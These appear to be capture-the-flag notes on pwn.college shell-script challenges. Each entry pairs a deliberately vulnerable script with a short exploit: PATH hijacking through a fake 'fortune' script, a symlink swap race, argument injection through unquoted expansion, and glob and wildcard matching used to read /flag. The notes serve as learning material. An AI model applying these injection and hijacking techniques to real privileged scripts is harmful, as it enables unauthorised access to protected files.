# The Transient Path

### chall

```sh
#!/opt/pwn.college/sh

fortune
```

### exploit
```
create shell script named 'fortune' in /home/hacker with content "cat /flag"
```

# Ferocious Functionality

### chall

```sh
#!/opt/pwn.college/bash

unset PATH
did you think you could hack this? It doesnt even exist!
```

### exploit
```sh
ln -s fortune did
```

last location where bash looks at for binary is current working directory

# The Surprising Swap

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

[ "$1" == "ping" ] && echo "pinged!" && read && "$0" pong
[ "$1" == "pong" ] && echo "ponged!"
```

### exploit
run /challenge/run via symlink
while /challenge/run is waiting for newline, swap symlink with 'cat /flag'

# Path of the Unquoted

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin

[ -n "$1" ] || exit 1
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && cat /flag

echo "Goodbye!"
```

### exploit
```sh
/challenge/run "1 = 1 -o flag"
```
due to unquoted expansion, was able to substitute $1 with any string

# Globbing Harmony

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin
cd /tmp
cat /flag | tr -d [A-Za-z0-9]
```

### exploit
```sh
touch /tmp/9
/challenge/run
```
"filename expansion" is used in tr command, which replaces that glob with matching file name, in our case by 9, and then truncates only character '9'.

# Zen of Expansion

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

pretty_cat () {
	HEADER="Here is /etc/passwd!"
	FILE="/etc/passwd"
	[ -n "$1" ] && HEADER="$1" && shift
	[ -n "$1" ] && FILE="$1" && shift

	echo "####### $HEADER ########"
	cat "$FILE"
}

[ "$#" -eq 1 ] || exit 1
pretty_cat $*
```

### exploit
```sh
/challenge/run "a /flag"
```
unquoted expansion of $* leads to supplying second parameter to pretty_cat function, causing second parameter to move to FILE variable.

# Way of the Wildcard

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read FLAG < /flag
[[ "$FLAG" = $1 ]] && cat /flag
echo "Goodbye!"
```

### exploit
```sh
/challenge/run "*"
```
'*' is a wildcard, expanding to any possible string